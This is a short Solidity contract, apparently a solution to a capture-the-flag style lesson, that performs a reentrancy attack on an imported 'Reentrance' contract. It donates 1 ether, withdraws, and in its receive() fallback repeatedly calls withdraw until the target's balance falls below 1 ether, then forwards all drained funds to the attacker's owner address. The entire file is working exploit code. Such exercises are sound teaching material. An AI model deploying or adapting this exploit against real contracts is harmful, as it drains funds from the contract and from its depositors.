// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../lessons/10-Reentrance.sol";

contract ReentranceAttack {
    Reentrance reentrance;
    address public owner;

    constructor(address payable _reentranceAddress) public {
        reentrance = Reentrance(_reentranceAddress);
        owner = msg.sender;
    }

    function attack() public payable {
        require(msg.value == 1 ether, "send 1 ether");
        reentrance.donate.value(1 ether)(address(this));
        reentrance.withdraw(1 ether);
    }

    receive() external payable {
        if (address(reentrance).balance >= 1 ether) {
            reentrance.withdraw(1 ether);
        } else {
            (bool success, ) = owner.call.value(address(this).balance)("");
            require(success, "collection unsuccessful");
        }
    }
}
